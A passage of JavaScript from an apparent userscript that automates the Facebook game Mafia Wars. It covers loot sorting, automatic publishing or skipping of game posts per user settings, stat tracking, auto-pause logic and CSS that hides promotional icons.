    //var popupElt = xpathFirst('.//div[@id="popup_fodder"]', appLayoutElt);
    if (!onProfileNav() && popupfodderElt && popupfodderElt.scrollWidth && popupfodderElt.innerHTML.length > 0) {
      var popupElts = $x('.//div[contains(@style, "block")]', popupfodderElt);
      if (popupElts && popupElts.length > 0) {
        for (var i = 0, iLength=popupElts.length; i < iLength; ++i) {
          if (popupElts[i] && popupElts[i].scrollWidth && popupElts[i].innerHTML.length > 0) {
            var foundPopup = true;
            break;
          }
        }
      }

      if (foundPopup) {
        pageChanged = true;
        justPlay = true;
      }
    }
  }

  // Handle changes to the inner page.
  if (pageChanged) {
    try {
      innerPageChanged(justPlay);
    } catch(ex) {
      addToLog('warning Icon', 'BUG DETECTED (pageChanged): ' + ex);
    }
  }
}


function objLootItem() {
  this.Attack = 0;
  this.Defense = 0;
  this.Quantity = 0;
  this.Element = null;
  this.Giftable = false;
}
function clearLootPage() {
    //Hide everything
    var colRows = $x('.//table[@class="main_table"]/tbody/tr',innerPageElt);
	var numRows = colRows.length;
    var id = 'MWAP_Temp_Loot_List';
    var tempDiv = document.getElementById(id);
    if(tempDiv) {
      tempDiv.parentNode.removeChild(tempDiv);
    }
    for (var i = 0; i < numRows; i++) {
      colRows[i].style.display="none";  // Hide everything.
    }
}
function restoreLootPage() {
    //Restore everything
    var colRows = $x('.//table[@class="main_table"]/tbody/tr',innerPageElt);
	var numRows = colRows.length;
    var id = 'MWAP_Temp_Loot_List';
    var tempDiv = document.getElementById(id);
    if(tempDiv) {
      tempDiv.parentNode.removeChild(tempDiv);
    }
    for (var i = 0; i < numRows; i++) {
      colRows[i].style.display="";  // Show everything.
    }
}

function cleanLoot(sortLootType) {
  var eltLoot = xpathFirst('.//table[@class="main_table"]', innerPageElt);
  var minAttack = 0;
  var minDefense = 0;

  var eltWeapons = document.createElement('tr');
  var eltArmor = document.createElement('tr');
  var eltAnimals = document.createElement('tr');
  var eltVehicles = document.createElement('tr');
  var eltSpecialLoot = document.createElement('tr');
  try {
  if (eltLoot.id == "") {  //Run once
    eltLoot.id = "break";

    var colRows = $x('.//table[@class="main_table"]/tbody/tr',innerPageElt);
	var numRows = colRows.length;
    var colLoot = new Array(4);
    for (var i = 0; i < 5; i++) {
      colLoot[i] = [];
    }
    var lootType = 0;
    var horzLine = colRows[0].innerHTML.clean().trim();
    for (var i = 0; i < numRows; i++) {
      var rowVal = $x('.//td',colRows[i]);

      switch(colRows[i].innerHTML.clean().trim()) {
      case 'Hidden Loot':
        lootType = -1;
        break;
      case 'Weapons':
        lootType = 0;
        colRows[i].setAttribute("id", "Weapons");
        eltWeapons = colRows[i];
        break;
      case 'Armor':
        lootType = 1;
        colRows[i].setAttribute("id", "Armor");
        eltArmor = colRows[i];
        break;
      case 'Animals':
        lootType = 2;
        colRows[i].setAttribute("id", "Animals");
        eltAnimals = colRows[i];
        break;
      case 'Vehicles':
        colRows[i].setAttribute("id", "Vehicles");
        eltVehicles = colRows[i];
        lootType = 3;
        break;
      case 'Special Loot':
        colRows[i].setAttribute("id", "Special Loot");
        eltSpecialLoot = colRows[i];
        lootType = 4;
        break;
      case 'Prep Loot':
        lootType = -1;
        break;
      case horzLine:
        break;
      default:

        var nameLoot = $x('.//strong',rowVal[1]);

        if (rowVal[5] == undefined) break;
        var splitAttack = rowVal[2].innerHTML.clean().trim().split(" ");
        var splitDefense = rowVal[3].innerHTML.clean().trim().split(" ");
        var splitQuantity = rowVal[5].innerHTML.clean().trim().split(" ");
        var objLoot = new objLootItem();
        objLoot.Name = nameLoot[0].innerHTML;
        objLoot.Attack = parseInt(splitAttack[0]);
        objLoot.Defense = parseInt(splitDefense[0]);
        objLoot.Quantity = parseInt(splitQuantity[1]);
        colLoot[lootType].push(objLoot);
        // Because parseInt removes any text, and leaves an int value, if there is any difference means there was other text such as Add
        // hence the loot item is giftable.
        if (objLoot.Quantity != splitQuantity[1]) objLoot.Giftable = true;
        break;

      }
      eltWeapons.setAttribute("class", JSON.stringify(colLoot[0]));
      eltArmor.setAttribute("class", JSON.stringify(colLoot[1]));
      eltAnimals.setAttribute("class",JSON.stringify(colLoot[2]));
      eltVehicles.setAttribute("class", JSON.stringify(colLoot[3]));
      eltSpecialLoot.setAttribute("class", JSON.stringify(colLoot[4]));
    }
  }
  var strType = "";
  switch(sortLootType) {
    case 0: //Disabled;
      restoreLootPage();
      return;
      break;
    case 1: //Attack
    case 2: //Defense
    case 3: //Combined
      lootType = 0;
      strType = "Weapons";
      break;
    case 4: //Attack
    case 5: //Defense
    case 6: //Combined
      lootType = 1;
      strType = "Armor";
      break;
    case 10: //Attack
    case 11: //Defense
    case 12: //Combined
      lootType = 2;
      strType = "Animals";
      break;
    case 7: //Attack
    case 8: //Defense
    case 9: //Combined
      lootType = 3;
      strType = "Vehicles";
      break;
  }
    // Find header you want to work on...
    clearLootPage();
    var eltLoot = document.getElementById(strType);
    eltLoot.style.display="";
    var colLoot = JSON.parse(eltLoot.getAttribute('class'));
    var Combined = false;

    switch(sortLootType) {
      case 1: //Attack
      case 4:
      case 7:
      case 10:
        minAttack = parseInt(sortAttack(colLoot));

        break;
      case 2:
      case 5: //Defense
      case 8:
      case 11:
        minDefense = parseInt(sortDefense(colLoot));
        break;
      case 3:
      case 6:
      case 9:
      case 12: //Combined
        minAttack = parseInt(sortAttack(colLoot));
        minDefense = parseInt(sortDefense(colLoot));
        Combined = true;
        break;
    }

    var objLoot = new objLootItem();
    var divElt = document.createElement("div");
    divElt.setAttribute('id', 'MWAP_Temp_Loot_List');
	var numRows = colLoot.length - 1;
    for (var i = 0; i < numRows; i++) {
      var newElt = document.createElement("tr");
      var tdName = document.createElement("td");
      var tdAttack = document.createElement("td");
      var tdDefense = document.createElement("td");
      var tdQuantity = document.createElement("td");

      var txtElt = document.createTextNode(colLoot[i].Name);
      tdName.appendChild(txtElt);

      txtElt = document.createTextNode("Attack: " + colLoot[i].Attack);
      tdAttack.appendChild(txtElt);

      txtElt = document.createTextNode("Defense: " + colLoot[i].Defense);
      tdDefense.appendChild(txtElt);

      txtElt = document.createTextNode("Total: " + colLoot[i].Quantity);
      tdQuantity.appendChild(txtElt);

      newElt.appendChild(tdName);
      newElt.appendChild(tdAttack);
      newElt.appendChild(tdDefense);
      newElt.appendChild(tdQuantity);

      if (Combined) {
        if(colLoot[i].Attack > minAttack -1 || colLoot[i].Defense > minDefense -1) divElt.appendChild(newElt);
      } else {
        if(colLoot[i].Attack > minAttack -1 && colLoot[i].Defense > minDefense -1) divElt.appendChild(newElt);
      }
    }
    insertAfter(eltLoot,divElt);

  } catch (ex) {
    addToLog('warning Icon', 'BUG DETECTED (doAutoPlay): ' + ex + '. Reloading.');
  }
  DEBUG ('minAttack = ' + minAttack + '   minDefense = ' + minDefense);

}
// This function inserts newNode after referenceNode
function insertAfter( referenceNode, newNode )
{
    referenceNode.parentNode.insertBefore( newNode, referenceNode.nextSibling );
}

function sortAttack(colLoot) {
  var minimum=0;
  colLoot.sort(function(a,b) {
    return b.Attack-a.Attack;
  });
  // Find top 501+ Attack
  var totalItems = 0;
  for (var x in colLoot)
  {
    totalItems += parseInt(colLoot[x].Quantity);
    minimum = parseInt(colLoot[x].Attack);
    if (totalItems > 500) break;
  }
  return minimum;
}

function sortDefense(colLoot) {
  var minimum=0;
  colLoot.sort(function(a,b) {
    return b.Defense-a.Defense;
  });
  // Find top 501+ Defense

  var totalItems = 0;
  for (var x in colLoot) {
    totalItems += colLoot[x].Quantity;
    minimum = colLoot[x].Defense;
    if (totalItems > 500) break;
  }
  return minimum;
}

// Clean up routine.
function removeCollection(eltCollection) {
  var eltSibling = eltCollection.previousSibling.previousSibling;
  var eltSibling2 = eltSibling.previousSibling.previousSibling;
  var eltSibling3 = eltSibling2.previousSibling.previousSibling;
  var eltSibling4 = eltSibling3.previousSibling.previousSibling;
  eltCollection.setAttribute('style','display:none;');
  if (eltSibling) eltSibling.setAttribute('style','display:none;');
  if (eltSibling2) eltSibling2.setAttribute('style','display:none;');
  if (eltSibling3) eltSibling3.setAttribute('style','display:none;');
  if (eltSibling4) eltSibling4.setAttribute('style','display:none;');
}

function setModificationTimer() {
  if (modificationTimer) window.clearTimeout(modificationTimer);
  modificationTimer = window.setTimeout(handleModificationTimer, 500);
  //GM_log('Modification timer set.');
}

function handleDOMSubtreeModified(e) {
  if (ignoreElement(e.target)) return;
  logElement(e.target, 'subtree');
}

function handleContentModified(e) {
  if (ignoreElement(e.target)) return;
  //logElement(e.target, 'content');
  setModificationTimer();
}

function handlePublishing() {
  fetchPubOptions();
  if (GM_getValue('isRunning')) {
    try {
      // Publishing/skipping posts
      var skipElt = xpathFirst('//input[@type="submit" and @name="cancel"]');
      var pubElt = xpathFirst('//input[@type="submit" and @name="publish"]');
      var okElt = xpathFirst('//input[@type="submit" and @name="error_ok"]');

      // If OK button is found, close the window by pressing it
      if (okElt) {
        DEBUG('Publish: Clicked OK button');
        clickElement(okElt);

      // If (1) Pub button is not found anymore; or
      //    (2) It's been 10 seconds since the post window loaded
      // Then close the window
      } else if (!pubElt || !timeLeftGM('postTimer')) {
        if (skipElt) {
          DEBUG('Publish: Clicked Skip');
          clickElement(skipElt);
        }
        else DEBUG('Publish: no Skip button found');
      }

      // Perform publishing logic once posting buttons have loaded
      if (skipElt && pubElt) {
        // Generic publishing function
        var checkPublish = function (xpathString, gmFlag, pubElt, skipElt) {
          var eltDiv = xpathFirst(xpathString);
          if (eltDiv) {
            if (isGMChecked(gmFlag)) clickElement(pubElt);
            else clickElement(skipElt);
            // Wait for 1 second before trying to close window manually
            window.setTimeout(handlePublishing, 1000);
            DEBUG('Publish: Found ' + gmFlag);
            return true;
          }
          return false;
        };

        // Gift post
        if (checkPublish('.//div[contains(., "sent")]/a[contains(@href, "sendgiftshort")]','autoGiftSkipOpt', skipElt, pubElt)) return;

        // Daily chance
        if (checkPublish('.//div[contains(., "prizes are given away each week")]','autoLottoOpt', skipElt, pubElt)) return;

        // Secret Stash
        if (checkPublish('.//div[contains(.,"secret stash")]','autoSecretStash', pubElt, skipElt)) return;

        // Iced Opponent
        if (checkPublish('.//div[contains(.,"just iced")]','autoIcePublish', pubElt, skipElt)) return;
        if (checkPublish('.//div[contains(.,"is cold blooded!")]','autoIcePublish', pubElt, skipElt)) return;

        // Level up bonus
        if (checkPublish('.//div[contains(.,"promoted")]','autoLevelPublish', pubElt, skipElt)) return;

        // Achievement bonus
        if (checkPublish('.//div[contains(.,"earned the")]','autoAchievementPublish', pubElt, skipElt)) return;

        // Job Help
        if (checkPublish('.//div[contains(.,"requested help")]','autoAskJobHelp', pubElt, skipElt)) return;

        // Moscow Job Help
        if (checkPublish('.//div[contains(.,"Friends get a bonus")]','selectMoscowTiercheck', pubElt, skipElt)) return;

        // Bangkok Job Help
        if (checkPublish('.//div[contains(.,"Friends get a bonus")]','selectBangkokTiercheck', pubElt, skipElt)) return;

        // Share wishlist
        if (checkPublish('.//div[contains(.,"is looking for")]','autoShareWishlist', pubElt, skipElt)) return;

        // War Reward
        if (checkPublish('.//div[contains(.,"and friends overwhelmed the Mafia")]','autoWarRewardPublish', pubElt, skipElt)) return;

        // War back up request
        if (checkPublish('.//div[contains(.,"needs help to win")]','autoWarResponsePublish', pubElt, skipElt)) return;

        // War rally for help
        if (checkPublish('.//div[contains(.,"sided with")]','autoWarRallyPublish', pubElt, skipElt)) return;

        // War Declaration
        if (checkPublish('.//div[contains(.,"and has Declared War")]','autoWarPublish', pubElt, skipElt)) return;
      }
    } catch (ex) {
      // Ignore exceptions
      GM_log('Publishing error: ' + ex);
    }
  }

  // If we get here, then at least one of the three buttons exists, so try again!
  DEBUG('Publish: Try again in 3 seconds.');
  window.setTimeout(handlePublishing, 3000);
}

// Turns on/off the high-level event listener for the game.
function setListenContent(on) {
  var elt = document.getElementById('mainDiv');
  if (!elt) return;
  if (on) {
    elt.addEventListener('DOMSubtreeModified', handleContentModified, false);
  } else {
    elt.removeEventListener('DOMSubtreeModified', handleContentModified, false);
  }
}

// Turns on/off the event listener for the stats section of the page.
function setListenStats(on) {
  var elt = document.getElementById('game_stats');
  if (!elt) return;
  if (on) {
    elt.addEventListener('DOMNodeInserted', statsInserted, false);
  } else {
    elt.removeEventListener('DOMNodeInserted', statsInserted, false);
  }
}

function statsInserted(e) {
  //if (!ignoreElement(e.target)) logElement(e.target, 'statsInserted');

  // Check for a change in a particular statistic. This is where we'll
  // notice some types of changes that happen without user or script
  // actions, such as earning energy.
  var parentElt = e.target.parentNode;
  if (!parentElt) return;
  if (parentElt == energyElt) {
    energy = parseInt(e.target.nodeValue);
    energyElt.style.textDecoration = (energy == maxEnergy)? 'blink' : 'none';
    //setLevelUpRatio();
  } else if (parentElt == staminaElt) {
    stamina = parseInt(e.target.nodeValue);
    staminaElt.style.textDecoration = (stamina == maxStamina)? 'blink' : 'none';
  } else if (parentElt == healthElt) {
    // NOTE: At one time, health was updated on with a timer. Leave
    //       this here in case it goes back to being that way.
    health = parseInt(e.target.nodeValue);
    // Make sure 'health' is never < 0
    health = health < 0 ? 0 : health;
    healthElt.style.textDecoration = (health > 19 && health < 29)? 'blink' : 'none';
  }
}

function innerPageChanged(justPlay) {
  // Reset auto-reload (if enabled).
  DEBUG('innerPageChanged');
  autoReload();

  // Perform actions here not requiring response logging
  doParseMessages();
  if (running) {
    doQuickClicks();
    if(isGMChecked('autoShareWishlist') && !timeLeftGM('wishListTimer')){
      autoWishlist();
    }
  }

  getPlayerEquip();
  // Customize the display.
  if (!justPlay) {
    setListenContent(false);
    customizeMasthead();
    customizeLayout();
    customizeStats();
    customizeNames();
    if (!customizeHome() &&
        !customizeJobs() &&
        !customizeNewJobs() &&
        !customizeVegasJobs() &&
        !customizeProfile() &&
        !customizeProps() &&
        !customizeHitlist()) {
      customizeFight();
    }
    setListenContent(true);
  }
  try {
    // If a click action was taken, check the response.
    if (clickAction) {
      var action = clickAction;
      var context = clickContext;
      clickAction = undefined;
      clickContext = undefined;
      if (!logResponse(innerPageElt, action, context)) {
        DEBUG('We did not get a valid logresponse, so kick off auto-play');
        // No further action was taken. Kick off auto-play.
        doAutoPlay();
      }
    } else {
      // Kick off auto-play.
      DEBUG('No action was taken, so kick off auto-play');
      doAutoPlay();
    }
  } catch (ex) {
    addToLog('warning Icon', 'BUG DETECTED (doAutoPlay): ' + ex + '. Reloading.');
    DEBUG('BUG DETECTED (doAutoPlay): ' + ex + '. Reloading.');
    autoReload(true);
  }
}

function chooseSides() {
  // Side-Handling
  choiceJobs.forEach( function(job) {
    var jobMatch;

    // Search the missions array for each name on the choice jobs
    for (var i = 0, iLength = job[CHOICE_JOBNAME].length; i < iLength; ++i) {
      jobMatch = missions.searchArray(job[CHOICE_JOBNAME][i], [0])[0];
      if (!isNaN(jobMatch)) break;
    }

    // Change the jobNo / jobName
    if (!isNaN(jobMatch)) {
      var sideIndex = GM_getValue(cities[job[CHOICE_CITY]][CITY_SIDE_NAME], 0);
      missions[jobMatch][MISSION_NAME] = job[CHOICE_JOBNAME][sideIndex];
      missions[jobMatch][MISSION_NUMBER] = job[CHOICE_JOBNO][sideIndex];
    }
  });
}

function closePopUp() {
  var skipPostElt = document.getElementById('fb_dialog_cancel_button');
  if (skipPostElt) clickElement (skipPostElt);
}

function refreshGlobalStats() {
  // NOTE: In this function, only elements displayed in and above the
  //       navigation bar should be examined. Everything in the inner page
  //       (what is displayed below the navigation bar) should instead be
  //       examined via innerPageChanged().

  var cityElt = document.getElementById('mw_city_wrapper');
  if (!cityElt) return false;

  if (cityElt.className.match(/mw_city(\d+)/))
    // FIXME: Not working for chrome at the moment
    //city = parseInt (RegExp.$1) - 1;
    city = parseInt (cityElt.className.replace('mw_city','')) - 1;
  else
    city = NY;

  // Once we see a post pop-up, set the timer to close it
  var skipPostElt = document.getElementById('fb_dialog_cancel_button');
  if (running && skipPostElt)
    window.setTimeout(closePopUp, 10000);

  // Set all the element globals. They change.
  cashElt = document.getElementById('user_cash_' + cities[city][CITY_ALIAS]);
  healthElt = document.getElementById('user_health');
  maxHealthElt = document.getElementById('user_max_health');
  energyElt = document.getElementById('user_energy');
  maxEnergyElt = document.getElementById('user_max_energy');
  staminaElt = document.getElementById('user_stamina');
  maxStaminaElt = document.getElementById('user_max_stamina');
  levelElt = document.getElementById('user_level');

    //      user_xp_level

  // Update basic player information.
  cities[city][CITY_CASH] = parseCash(cashElt.innerHTML);
  health = parseInt(healthElt.innerHTML);
  // Make sure 'health' is never < 0
  health = health < 0 ? 0 : health;
  maxHealth = parseInt(maxHealthElt.innerHTML);
  energy = parseInt(energyElt.firstChild.nodeValue);
  maxEnergy = parseInt(maxEnergyElt.innerHTML);
  stamina = parseInt(staminaElt.firstChild.nodeValue);
  maxStamina = parseInt(maxStaminaElt.innerHTML);
  level = parseInt(levelElt.innerHTML);

  // Set all the element globals. They change.

//  curExpElt = document.getElementById('user_experience');
//  curExp = parseInt(curExpElt.innerHTML);
  if(new_header) {
    ptsToNextLevelElt = document.getElementById('user_xp_to_next_level');
    ptsToNextLevel = parseInt(ptsToNextLevelElt.innerHTML);
    lvlExp = ptsToNextLevel;
  } else {
    lvlExpElt = document.getElementById('exp_to_next_level');  // exp needed to level up
    lvlExp = parseInt(lvlExpElt.innerHTML);
    ptsToNextLevel = lvlExp;
  }


  // Get the mafia size and pending invites.
  mafia = xpathFirst('//span[@id="user_group_size"]');
  if (mafia) {
    mafia = parseInt(mafia.innerHTML.untag());
  }
  if (!mafia || mafia < 1) {
    addToLog('warning Icon', 'BUG DETECTED: Unable to read mafia size.');
  }

  invites = xpathFirst('//span[@id="user_request"]');
  if (invites) {
    invites = parseInt(invites.innerHTML.untag());
  } else {
    invites = 0;
  }

  // Get the skill points waiting to be spent.
  var skillElt = document.getElementById('user_skill');
  if (skillElt) {
    stats = parseInt(skillElt.innerHTML);
    if (isNaN(stats)) {
      stats = 0;
    }
  } else {
    stats = 0;
  }

  // Update current level so the next if will work
  if (isGMUndefined('currentLevel')) {
    GM_setValue('currentLevel', level);
    GM_setValue('restAutoStat', 0);
  }

  // Show congratulations if level has increased.
  if (running && level > GM_getValue('currentLevel')) {
    GM_setValue('currentLevel', level);
    addToLog('experience Icon', '<span style="color:#00FFCC;"> Congratulations on reaching level <strong>' + level + '</strong>!</span>');
    GM_setValue('restAutoStat', 0);
  }

  return true;
}

function refreshSettings() {
  // NOTE: In this function, only elements displayed in and above the
  //       navigation bar should be examined. Everything in the inner page
  //       (what is displayed below the navigation bar) should instead be
  //       examined via innerPageChanged().

  // Refresh spend ceiling, floor and burn condition
  var canLevel = ptsToNextLevel < stamina * getStaminaGainRate() + energy * getEnergyGainRate();
  SpendStamina.refreshLimits (maxStamina, canLevel);
  SpendEnergy.refreshLimits (maxEnergy, canLevel);

  // Log and toggle burning
  if (running) {
    if (isGMChecked(SpendStamina.spendFlag)) SpendStamina.toggleSpending(maxStamina, stamina);
    if (isGMChecked(SpendEnergy.spendFlag)) SpendEnergy.toggleSpending(maxEnergy, energy);
  }

  // Auto-pause reset
  if (GM_getValue('autoPauseActivated') === true &&
      isGMChecked('autoPauseBefore') &&
      GM_getValue('autoPauselvlExp') < ptsToNextLevel) {
    GM_setValue('autoPauselvlExp',ptsToNextLevel);
    GM_setValue('autoPauseActivated', false);
  }

  // Auto-pause logic
  if (running && isGMChecked('autoPause')) {
    if (isGMChecked('autoPauseBefore') &&
        GM_getValue('autoPauseExp', '') >= ptsToNextLevel &&
        GM_getValue('autoPauseActivated', false) === false) {
      addToLog('pause Icon', 'Auto-pause in effect. Experience threshold reached.');
      GM_setValue('autoPauseActivated', true);
      pause();
    } else if (isGMChecked('autoPauseAfter') &&
               GM_getValue('autoPauselvlExp', '') < ptsToNextLevel) {
      addToLog('pause Icon', 'Auto-pause in effect. Leveled up.');
      GM_setValue('autoPauselvlExp', ptsToNextLevel);
      pause();
    }
  }
}

function getStaminaGainRate() {
  var expGained    = GM_getValue('totalExpInt', 0);
  var staminaSpent = GM_getValue('fightWinCountInt', 0) +
                     GM_getValue('fightLossCountInt', 0) +
                     GM_getValue('hitmanWinCountInt',0) +
                     GM_getValue('hitmanLossCountInt',0) +
                     GM_getValue('totalRobStamInt',0);
  if (!expGained || !staminaSpent) return 0;

  return expGained / staminaSpent;
}

function getEnergyGainRate() {
  var rate = parseFloat(GM_getValue('estimateJobRatio', '1.0'));
  return rate? rate : 0;
}

function setFBParams() {
  // Get FB name
  var fbName = document.getElementById("navAccountName");
  if (fbName) GM_setValue('FBName', fbName.innerHTML);

  // Get language
  GM_setValue('language', document.documentElement.lang);

  sendMWValues(['language','FBName']);
}

// [CHROME] Copy GM values to background storage
// Note: This method is not synchronous
function copyMWValues (gmKeys) {
  if (gvar.isGreaseMonkey) return;
  var gmPairs = {};
  for (var i in gmKeys)
    gmPairs[gmKeys[i]] = '';
  gmPairs.action = 'getGM';
  chrome.extension.sendRequest(gmPairs, function(response) {
    for (var i in response)
      GM_setValue(i, response[i])
  });
}

// [CHROME] Fetch GM values from background storage
// Note: This method is not synchronous
function sendMWValues(gmKeys) {
  if (gvar.isGreaseMonkey) return;
  var gmPairs = {};
  for (var i in gmKeys)
    gmPairs[gmKeys[i]] = GM_getValue(gmKeys[i]);
  gmPairs.action = 'setGM';
  chrome.extension.sendRequest(gmPairs);
}

function customizeLayout() {
  var mainDiv = xpathFirst('//div[@id="mainDiv"]');
  if (!mainDiv) return;

  // Handle Unknown error
  var unkError = xpathFirst('//div[@class="ui-dialog ui-widget ui-widget-content ui-corner-all ui-draggable ui-resizable"]');
  if (unkError) {
    DEBUG('Error encountered, reloading...');
    window.location.reload(true);
  }
}

function refreshMWAPCSS() {
  try {
    var cssElt = document.getElementById('mwapCSS');
    var mwapCSS = '';
    if (cssElt) mwapCSS = cssElt.innerHTML;
    var newCSS = 'html { overflow-y: auto !important } body { background: black; text-align: left; }' +
                 ' #mainDiv {position: absolute; top: 0px; width:758px;} div.app {padding:0; width:746px;}' +

                 // Elevate freegift friendlist box:
                 ' #request_form_interstitial_exclude_type_3  {z-index: 10000;}' +
                 (isGMChecked('mastheadOnTop') ? ' #mw_masthead {z-index: 10000;}' : '') +
                 (isGMChecked('leftAlign') ? ' #final_wrapper {margin: 0; position: static; text-align: left; width: 760px;}' : ' #final_wrapper {margin: 0 auto; position: static; text-align: left; width: 760px;}') +

                 // Move the messagecenter button(s):
                 (isGMChecked('hideMessageIcon') ?
                  ' div[style$="position: absolute; top: 13px; right: 126px; width: 45px; z-index: 1;"] {display: none;}' +
                    ' div[style$="position: absolute; top: 15px; right: 130px; width: 45px; z-index: 1;"] {display: none;}' +
                    ' div[style$="position: absolute; top: 15px; right: 130px; width: 45px; z-index: 100;"] {display: none;}' :
                  ' div[style$="position: absolute; top: 13px; right: 126px; width: 45px; z-index: 1;"] {position: relative !important; top: 15px !important; left: 755px !important; z-index: 100 !important;}' +
                    ' div[style$="position: absolute; top: 15px; right: 130px; width: 45px; z-index: 1;"] {top: 15px !important; left: 755px !important; z-index: 100 !important;}' +
                    ' div[style$="position: absolute; top: 15px; right: 130px; width: 45px; z-index: 100;"] {top: 15px !important; left: 755px !important; z-index: 100 !important;}') +
                 //' div[id="message_center_div"] {z-index: 10001 !important;}' +

                 // Move Slot Machine and click box:
                 (isGMChecked('HideSlotMachine') ?
                  ' #slots_icon_container  {display: none;}' +
                  ' #slots_icon_cover      {display: none;}' :
                  ' #slots_icon_container  {position: absolute; top: 265px; left: 755px; z-index: 99;} ' +
                  ' #slots_icon_cover      {position: absolute; top: 265px; left: 755px; z-index: 100;} ') +

                 // Move Zynga selling Promo icon and click box and make it smaller:
                 (isGMChecked('hidePromoIcon') ?
                  ' #buyframe_link_container  {display: none;}' +
                  ' #buyframe_link_cover      {display: none;}' :
                  ' #buyframe_link_container  {position: absolute; top: 50px; left: 755px; z-index: 100;} ' +
                  ' #buyframe_link_cover      {position: absolute; top: 50px; left: 755px; z-index: 100;} ') +

                 // Move other Zynga selling Promo icon and click box and make it smaller:
                 (isGMChecked('hidePromoIcon') ?
                  ' #buyframe_link_container_anim  {display: none;}' +
                  ' #buyframe_link_cover_anim      {display: none;}' :
                  ' #buyframe_link_container_anim  {position: absolute; top: 50px; left: 755px; z-index: 100;} ' +
                  ' #buyframe_link_cover_anim      {position: absolute; top: 50px; left: 755px; z-index: 100;} ') +

                // Move Promo and make it smaller:
                (isGMChecked('hidePromoIcon') ?
                  ' #promoicon_container {display: none;}' :
                  ' #promoicon_container {position: absolute; top: 100px; left: 755px; z-index: 100;} ') +

                // Move World Cup Promo icon and make it smaller:
                 (isGMChecked('hidePromoIcon') ?
                    ' #gc_collectible_container {display: none;}' :
                    ' #gc_collectible_container {position: absolute; top: 145px; left: 755px; z-index: 100;} ') +

                // Move zstream  icon and make it smaller:
                 (isGMChecked('hideLiveUpdatesIcon') ?
                   ' #zstream_icon {display: none;}' :
                   ' #zstream_icon {position: absolute; top: 10px; left:290px; z-index: 100;} ') +

                // Hide Icon Row (header_mid_row) - This is the part containing all the icons (messege center, promo, live updates):
                (isGMChecked('hideAttentionBox') ?
                  ' .header_mid_row div.header_various {display: none;}' :
                  ' .header_mid_row div.header_various {position: absolute; top: 1px; left: 825px; width: 12px; z-index: 100;} ') +

                // Move gift icon and make it smaller:
                 (isGMChecked('hideGiftIcon') ?
                   ' #gifticon_container {display: none;}' :
                   ' #gifticon_container {position: absolute; top: 220px; left: 755px; z-index: 100;}  ') +

                 // Move London Countdown:
                 ' div[style$="position: absolute; left: 30px; top: 180px; font-size: 10px; color: rgb(255, 204, 0);"] {top:163px !important;}' +

                 // Show hidden jobs for new job layout
                 ' div[@id="new_user_jobs"] > div {display: block !important} ' +
                 // Adjust level/experience CSS
                 ' div[class="user_xp_level"] * {font-size: 11px !important} ' +
                 // Adjust player updates table when hiding friend ladder
                 (isGMChecked('hideFriendLadder') ?
                 ' .update_txt {width: 680px !important} ' +
                 ' .update_item {width: 710px !important} ' +
                 ' .player_updates {width: 728px !important} ' +
                 ' div[class$="tab_box_content"] {width: 738px !important} ' +
                 ' .playerupdate_box {width: 740px !important} ' : '' ) +
                 // Move menus and make the travelmenu button smaller:
                 ' div[onmouseover="travelopen()"] {position: absolute !important; left: 333px !important; width: 125px !important;}' +
                  ' div[id="button_travel_locked"] {width: 125px !important;}' +
                    ' a[class="sexy_button_new sexy_button_new_hover_state short_black sexy_lock_new"] {width: 120px !important;}' +
                  ' div[id="travel_container"] {width: 125px !important;}' +
                    ' a[class="sexy_button_new short_black_white_border sexy_travel_new"] {width: 120px !important;}' +
                  ' div[id="travel_menu"] {width: 140px;}' +
                 ' div[onmouseover="instructionopen()"] {position: absolute !important; left: 460px !important;}' +

//                 (isGMChecked('hideAttentionBox') ? ' div[id="popup_fodder"][style*="display: block;"], ' : '' ) +
                 (isGMChecked('hideAttentionBox') ? ' div[class="tab_box_content"][style*="padding: 5px; text-align: center; margin-bottom: 420px;"], ' : '' ) +

                 // Hide action boxes
                 (isGMChecked('hideActionBox') ? ' .message_box_full, ' : '' ) +
                 (isGMChecked('hideActionBox') ? ' .menu_divider, ' : '' ) +
                 // Hide Limited Time Offers
                 (isGMChecked('hideOffer') ? ' div[class="tab_box"][style*="left"], ' : '' ) +
                 // Hide Holiday Free Gifts / Gift Safe House / Mystery Gifts
                 (isGMChecked('hideGifts') ? ' img[alt="Free Holiday Gifts!"], ' +
                                             ' img[alt="Gift Safe House"], ' +
                                             ' img[alt="Free Mystery Bag!"], ' : '' ) +
                 // Hide friends ladder
                 (isGMChecked('hideFriendLadder') ? ' .friendladder_box, ' : '' ) +
                 // Hide the Zynga bar, progress bar, email bar, sms link, new button market place
                 ' #mwapHide, #mw_zbar, #mw_zbar iframe, #setup_progress_bar, #intro_box, ' +
                 ' *[id*="bouncy"], .fb_email_prof_header, .mw_sms, #ajax_inner, #ajax_result ' +
                 ' {position: absolute !important; margin:0 !important; ' +
                 '  height:0 !important; width: 0 !important; display: none !important;}' +
                 // ********************** Stats Tab CSS **********************
                 '#statsWindow #sWindowTabNav div{border-right:1px solid #000;float:left;padding:0 7px;position:static;text-align:center}' +
                 '#statsWindow #sWindowTabNav div.selected{background : rgb(60,60,100);}' +
                 '#statsWindow #sWindowTabNav div a{color:#fff;font-weight:700}' +
                 '#statsWindow .sexy_button{position:absolute;background:black;border:1px solid #FFD927;color:#FFD927;cursor:pointer;display:block;float:left;font-size:14px;font-weight:700;padding:5px;text-decoration:none;width:auto}' +
                 '#statsWindow .sexy_button button{background:transparent;border:medium none #FFF;color:#FFD927;cursor:pointer;font-size:14px;font-weight:700;margin:0}' +
                 '#statsWindow .sexy_button button:hover{color:#BCD2EA;font-weight:700;text-decoration:none}' +
                 '#statsWindow .tabcontent{display:none;}' +
                 '#statsWindow label {font-weight: normal; color: #BCD2EA}' +
                 // ********************** Settings Tab CSS **********************
                 '#settingsBox #tabNav div{border-right:1px solid #000;float:left;padding:0 7px;position:static;text-align:center}' +
                 '#settingsBox #tabNav div.selected{background : #666666;}' +
                 '#settingsBox #tabNav div a{color:#fff;font-weight:700}' +
                 '#settingsBox .sexy_button{position:absolute;background:black;border:1px solid #AAAAAA;color:#D0D0D0;cursor:pointer;display:block;float:left;font-size:13px;font-weight:700;padding:2px;text-decoration:none;width:auto}' +
                 '#settingsBox .sexy_button button{background:transparent;border:1px none #FFF;color:#D0D0D0;cursor:pointer;font-size:13px;font-weight:700;margin:0}' +
                 '#settingsBox .sexy_button button:hover{background:#666666;font-weight:700;text-decoration:none}' +
                 '#settingsBox .tabcontent{display:none;height:420px;top:40px;width:600px}' +
                 '#settingsBox div,#settingsBox select,#settingsBox textarea{position:absolute}' +
                 '#settingsBox select,#settingsBox input{border:1px solid;} #settingsBox textarea{border:2px solid;}' +
